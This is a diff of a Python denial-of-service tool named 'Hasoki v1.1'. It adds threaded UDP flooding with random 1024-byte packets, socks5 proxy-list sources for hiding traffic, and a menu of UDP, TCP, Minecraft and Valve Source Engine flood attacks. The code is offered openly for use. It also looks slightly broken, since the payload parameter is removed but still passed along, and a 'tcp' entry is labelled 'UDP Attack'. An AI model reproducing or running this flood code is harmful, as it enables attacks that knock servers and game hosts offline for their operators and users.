@@ -1,7 +1,8 @@
 # -*- coding: utf-8 -*-
+# From NV with love
+# Hasoki v1.1
 from os import system, name
 import httpx
-#import asyncio
 from httpx import AsyncClient, Headers
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
 from urllib.parse import urlparse
@@ -157,6 +158,7 @@ method = [
     "POST",
     "HEAD",
 ]
+#socks5resource
 proxyResources = [
     'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
     'https://www.proxy-list.download/api/v1/get?type=socks5',
@@ -307,11 +309,11 @@ def vse(host, port, rand, until_datetime):
         except:
             sock.close()
             pass
-def runsender(host, port, th, t, payload):
-    if payload == "":
-        payload = random._urandom(60000)
+def runsender(host, port, th, t):
+ #   if payload == "":
+ #       payload = random._urandom(1024)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    #payload = Payloads[method]
+ #   payload = Payloads[method]
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=sender, args=(host, port, until, payload))
@@ -324,6 +326,8 @@ def sender(host, port, until_datetime, payload):
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
+   #         for _ in range(200):
+            payload = random._urandom(1024)
             sock.sendto(payload, (host, int(port)))
         except:
             sock.close()
@@ -939,7 +943,7 @@ def layer4():
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"mine  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Minecraft Dos attack                      "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"vse   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Send Valve Source Engine Protocol         "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
